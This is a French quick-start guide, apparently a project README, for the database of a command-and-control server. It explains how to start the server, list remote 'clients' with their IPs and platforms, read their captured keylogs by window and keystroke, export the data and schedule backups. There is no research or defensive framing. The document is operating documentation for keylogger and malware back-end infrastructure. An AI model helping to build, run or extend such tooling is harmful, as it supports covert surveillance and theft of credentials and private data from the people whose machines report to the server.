# 🚀 Guide de Démarrage Rapide - Base de Données C2

## Installation

### 1. Installer les dépendances

```bash
pip install -r requirements.txt
```

Ou manuellement :
```bash
pip install Flask tabulate requests
```

### 2. Tester la base de données

```bash
python test_database.py
```

Si tous les tests passent (✅), vous êtes prêt !

## Utilisation

### Démarrer le serveur

```bash
python server.py
```

Le serveur va :
- ✅ Créer automatiquement la base de données `c2_server.db`
- ✅ Initialiser toutes les tables
- ✅ Démarrer les threads de nettoyage automatique
- ✅ Écouter sur le port 5000

### Visualiser les données

#### Voir tous les clients
```bash
python db_manager.py --clients
```

#### Voir les statistiques globales
```bash
python db_manager.py --stats
```

#### Voir les keylogs
```bash
python db_manager.py --keylogs
```

#### Voir l'historique des activités
```bash
python db_manager.py --activities
```

#### Export complet
```bash
python db_manager.py --export backup_$(date +%Y%m%d_%H%M%S).json
```

### Exemples de Requêtes Avancées

#### Keylogs d'un client spécifique (100 derniers)
```bash
python db_manager.py --keylogs --client CLIENT_ID_ICI --limit 100
```

#### Détails complets d'un client
```bash
python db_manager.py --client-details CLIENT_ID_ICI
```

#### Activités d'un client
```bash
python db_manager.py --activities --client CLIENT_ID_ICI
```

#### Nettoyage manuel
```bash
python db_manager.py --cleanup
```

## Accès Programmatique

### Depuis Python

```python
from database import Database

# Initialiser
db = Database()

# Récupérer tous les clients
clients = db.get_all_clients()
for client in clients:
    print(f"Client: {client['client_id']}")
    print(f"  - Plateforme: {client['system_info'].get('platform')}")
    print(f"  - IP: {client['ip']}")
    print(f"  - Online: {client['online']}")

# Récupérer les keylogs d'un client
keylogs = db.get_keylogs("CLIENT_ID", limit=50)
for log in keylogs:
    print(f"[{log['timestamp']}] {log['window']}: {log['key']}")

# Récupérer les statistiques
stats = db.get_keylog_stats()
print(f"Total keylogs: {stats['total_logs_stored']}")
```

### Depuis SQL directement

```bash
# Ouvrir la BD avec sqlite3
sqlite3 c2_server.db

# Exemples de requêtes
SELECT * FROM clients;
SELECT COUNT(*) FROM keylogs;
SELECT client_id, COUNT(*) as log_count FROM keylogs GROUP BY client_id;
SELECT * FROM activity_log ORDER BY timestamp DESC LIMIT 10;
```

## Maintenance

### Sauvegarde Automatique (Recommandé)

Créer un script de sauvegarde :

**backup.sh** (Linux/Mac) :
```bash
#!/bin/bash
BACKUP_DIR="backups"
mkdir -p $BACKUP_DIR
DATE=$(date +%Y%m%d_%H%M%S)
cp c2_server.db $BACKUP_DIR/c2_server_$DATE.db
python db_manager.py --export $BACKUP_DIR/c2_export_$DATE.json
echo "Backup créé: $DATE"
```

**backup.bat** (Windows) :
```batch
@echo off
set BACKUP_DIR=backups
if not exist %BACKUP_DIR% mkdir %BACKUP_DIR%
set DATETIME=%date:~-4%%date:~3,2%%date:~0,2%_%time:~0,2%%time:~3,2%%time:~6,2%
copy c2_server.db %BACKUP_DIR%\c2_server_%DATETIME%.db
python db_manager.py --export %BACKUP_DIR%\c2_export_%DATETIME%.json
echo Backup cree: %DATETIME%
```

### Planifier les sauvegardes

**Linux (crontab)** :
```bash
# Sauvegarde quotidienne à 3h du matin
0 3 * * * cd /path/to/project && ./backup.sh
```

**Windows (Task Scheduler)** :
```powershell
# Créer une tâche planifiée
$action = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-File C:\path\to\backup.ps1"
$trigger = New-ScheduledTaskTrigger -Daily -At 3am
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "C2_Backup" -Description "Sauvegarde quotidienne de la BD C2"
```

## Dépannage

### La base de données est verrouillée

```python
# Dans database.py, augmenter le timeout
conn = sqlite3.connect(self.db_path, timeout=30.0)
```

### Base de données corrompue

```bash
# Vérifier l'intégrité
sqlite3 c2_server.db "PRAGMA integrity_check;"

# Si corruption, récupérer les données
sqlite3 c2_server.db ".recover" | sqlite3 c2_recovered.db
mv c2_recovered.db c2_server.db
```

### Performances lentes

```bash
# Optimiser la BD
sqlite3 c2_server.db "VACUUM;"
sqlite3 c2_server.db "ANALYZE;"
```

### Nettoyer complètement

```bash
# Supprimer la BD et recommencer
rm c2_server.db
python server.py  # Recréera la BD
```

## Différences avec la version mémoire

### Avant (En mémoire)
- ❌ Données perdues au redémarrage
- ❌ Limite de RAM
- ❌ Pas d'historique
- ❌ Pas d'analyse

### Maintenant (Base de données)
- ✅ Données persistantes
- ✅ Stockage illimité
- ✅ Historique complet
- ✅ Requêtes SQL puissantes
- ✅ Export/Import facile
- ✅ Sauvegarde simple

## Sécurité

⚠️ **IMPORTANT** : Sécurisez votre base de données !

```bash
# Linux
chmod 600 c2_server.db

# Windows (PowerShell admin)
icacls c2_server.db /inheritance:r /grant:r "$env:USERNAME`:F"
```

## Support

Pour plus de détails, consultez :
- [DATABASE_README.md](DATABASE_README.md) - Documentation complète
- [database.py](database.py) - Code source et API
- [db_manager.py](db_manager.py) - Script de gestion

## Tests

Exécuter les tests à tout moment :

```bash
python test_database.py
```

Tous les tests doivent passer (✅).
